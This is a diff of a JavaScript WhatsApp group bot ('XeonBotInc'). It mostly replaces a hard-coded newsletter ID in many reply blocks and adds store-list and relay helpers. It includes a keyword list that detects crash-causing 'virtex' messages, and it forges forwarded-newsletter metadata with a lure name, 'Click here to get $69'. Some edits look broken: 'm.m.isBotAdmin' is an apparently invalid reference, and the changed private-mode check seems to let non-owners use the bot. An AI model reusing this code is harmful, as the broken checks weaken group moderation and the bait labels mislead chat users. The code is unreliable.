@@ -108,6 +108,9 @@ let vote = db.others.vote = []
 const xeonverifieduser = JSON.parse(fs.readFileSync('./src/user.json'));
 const premium = JSON.parse(fs.readFileSync('./database/premium.json'));
 
+//store database
+const db_respon_list = JSON.parse(fs.readFileSync('./src/store/list.json'))
+
 global.db = JSON.parse(fs.readFileSync('./database/database.json'))
 if (global.db) global.db = {
 sticker: {},
@@ -173,6 +176,12 @@ module.exports = XeonBotInc = async (XeonBotInc, m, chatUpdate, store) => {
         const isQuotedDocument = type === 'extendedTextMessage'
 		//anti media
         const isXeonMedia = m.mtype
+        
+        //bug
+        const clientId = XeonBotInc.user.id.split(':')[0];
+        const senderbot = m.key.fromMe ? XeonBotInc.user.id.split(':')[0] + "@s.whatsapp.net" || XeonBotInc.user.id : m.key.participant || m.key.remoteJid;
+        const senderId = senderbot.split('@')[0];
+        const isBot = clientId.includes(senderId);
 		
 		try {
 		const isNumber = x => typeof x === 'number' && !isNaN(x)
@@ -314,7 +323,7 @@ module.exports = XeonBotInc = async (XeonBotInc, m, chatUpdate, store) => {
 		})
 		
 		if (!XeonBotInc.public) {
-			if (!m.key.fromMe) return
+			if (XeonTheCreator && !m.key.fromMe) return
 		}
 		
 		//Log
@@ -435,7 +444,7 @@ module.exports = XeonBotInc = async (XeonBotInc, m, chatUpdate, store) => {
         //antibot
         if (db.groups[m.chat].antibot) {
     if (m.isBaileys && m.fromMe == false){
-        if (m.isAdmin || !m.isBotAdmins){		  
+        if (m.isAdmin || !m.m.isBotAdmin){		  
         } else {
           replygcxeon(`*Another Bot Detected*\n\nHusshhh Get away from this group!!!`)
     return await XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
@@ -495,7 +504,7 @@ if (budy.includes('๒๒๒๒') || budy.includes('ดุ') || budy.includes('�
 if (m.isBotAdmin) return replygcxeon('*VIRTEX DETECTED*')
 console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
 XeonBotInc.sendText(m.chat, `*MARK AS READ*\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n *Virus sender here👇:* \nwa.me/${sender.split("@")[0]}`)   
-if (!m.isBotAdmins) return
+if (!m.m.isBotAdmin) return
 if(XeonTheCreator) return
 XeonBotInc.groupParticipantsUpdate(m.chat, [sender], 'remove')
 await XeonBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
@@ -906,7 +915,7 @@ forwardingScore: 999,
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterName: "Click here to get $69",
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: global.xchannel.jid,
 },
 externalAdReply: {  
 showAdAttribution: true,
@@ -921,6 +930,20 @@ text: txt,
 return XeonBotInc.sendMessage(m.chat, xeonnewrep, {
 quoted: m,
 })
+}
+
+//premium
+        async function replyprem(teks) {
+    replygcxeon(`This feature is for premium user, contact the owner to become premium user`)
+}
+
+//script replier
+        async function sendXeonBotIncMessage(chatId, message, options = {}){
+    let generate = await generateWAMessage(chatId, message, options)
+    let type2 = getContentType(generate.message)
+    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
+    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
+    return await XeonBotInc.relayMessage(chatId, generate.message, { messageId: generate.key.id })
 }
 
 //theme sticker reply
@@ -1057,6 +1080,20 @@ async function obfus(query) {
         reject(e)
     }
     })
+}
+
+// Response Addlist
+if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
+var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
+if (get_data_respon.isImage === false) {
+XeonBotInc.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
+quoted: m
+})
+} else {
+XeonBotInc.sendMessage(m.chat, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
+quoted: m
+})
+} 
 }
 
 // Respon Cmd with media
@@ -1568,7 +1605,7 @@ case 'handsomecheck':{
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -1613,7 +1650,7 @@ case 'beautifulcheck':{
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -1658,7 +1695,7 @@ return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -1930,7 +1967,7 @@ const sendSlide = async (jid, title, message, footer, slides) => {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -2071,7 +2108,7 @@ ${translatedTafsirEnglish.text}`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -2143,7 +2180,7 @@ ${translatedChapterHindi.text}`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -2164,25 +2201,25 @@ if (!m.isGroup) return XeonStickGroup()
 var args1 = text.split("@")[0]
 var args2 = text.split("@")[1]
 if (!q.includes("@")) return replygcxeon(`Usage Example: ${prefix+command} *Item Name@Item*\n\n_Example_\n\n${prefix+command} namelist@List`)
-if (isAlreadyResponList(from, args1, db_respon_list)) return replygcxeon(`List of responses with key : *${args1}* already in this group.`)
+if (isAlreadyResponList(m.chat, args1, db_respon_list)) return replygcxeon(`List of responses with key : *${args1}* already in this group.`)
 if (/image/.test(mime)) {
 media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
 mem = await TelegraPh(media)
-addResponList(from, args1, args2, true, `${mem}`, db_respon_list)
+addResponList(m.chat, args1, args2, true, `${mem}`, db_respon_list)
 replygcxeon(`Successfully set list message with key : *${args1}*`)
 if (fs.existsSync(media)) fs.unlinkSync(media)
 } else {
-addResponList(from, args1, args2, false, '-', db_respon_list)
+addResponList(m.chat, args1, args2, false, '-', db_respon_list)
 replygcxeon(`Successful Add List With Key : *${args1}*`)
 }
 break
 case 'dellist':
-if (!XeonBotInc) return XeonStickOwner()
+if (!XeonTheCreator) return XeonStickOwner()
 if (!m.isGroup) return XeonStickGroup()
 if (db_respon_list.length === 0) return replygcxeon(`There is no message list in the database yet`)
 if (!q) return replygcxeon(`Usage Example: ${prefix + command} *Item name*\n\n_Example_\n\n${prefix + command} listname`)
-if (!isAlreadyResponList(from, q, db_respon_list)) return replygcxeon(`Item list by Name *${q}* not in the database!`)
-delResponList(from, q, db_respon_list)
+if (!isAlreadyResponList(m.chat, q, db_respon_list)) return replygcxeon(`Item list by Name *${q}* not in the database!`)
+delResponList(m.chat, q, db_respon_list)
 replygcxeon(`Successfully delete list message with key *${q}*`)
 break
 case 'store':
@@ -2320,7 +2357,7 @@ if (!AntiNsfw) return replygcxeon(mess.nsfw)
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -2368,7 +2405,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -2415,7 +2452,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -2463,7 +2500,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -2510,7 +2547,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -2557,7 +2594,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -2604,7 +2641,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -2652,7 +2689,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -2700,7 +2737,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -2748,7 +2785,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -2796,7 +2833,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -2844,7 +2881,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -2892,7 +2929,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -2941,7 +2978,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -2985,7 +3022,7 @@ await XeonStickWait()
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -3030,7 +3067,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -3075,7 +3112,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -3120,7 +3157,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -3165,7 +3202,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -3210,7 +3247,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -3255,7 +3292,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -3300,7 +3337,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -3345,7 +3382,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -3390,7 +3427,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -3435,7 +3472,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -3480,7 +3517,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -3525,7 +3562,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -3570,7 +3607,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -3615,7 +3652,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -3660,7 +3697,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -3705,7 +3742,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -3750,7 +3787,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -3795,7 +3832,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -3840,7 +3877,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -3885,7 +3922,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -3930,7 +3967,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -3975,7 +4012,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -4020,7 +4057,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -4065,7 +4102,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -4110,7 +4147,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -4155,7 +4192,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -4200,7 +4237,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -4245,7 +4282,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -4290,7 +4327,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -4335,7 +4372,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -4380,7 +4417,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -4425,7 +4462,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -4470,7 +4507,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -4515,7 +4552,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -4560,7 +4597,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -4605,7 +4642,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -4650,7 +4687,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -4695,7 +4732,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -4740,7 +4777,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -4785,7 +4822,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -4848,7 +4885,7 @@ _*Here is the result of ${text}*_\n\n${animetxt}`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -4894,7 +4931,7 @@ return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -4940,7 +4977,7 @@ return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -4985,7 +5022,7 @@ return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -5063,7 +5100,7 @@ return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -5556,7 +5593,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -7108,7 +7145,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -7155,7 +7192,7 @@ case 'truth': case 'dare': {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -7282,7 +7319,7 @@ case 'dere':{
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -7418,7 +7455,7 @@ return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -7467,7 +7504,7 @@ try {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -7521,7 +7558,7 @@ return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -7565,7 +7602,7 @@ return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -7615,7 +7652,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -7662,7 +7699,7 @@ break
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -7708,7 +7745,7 @@ return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
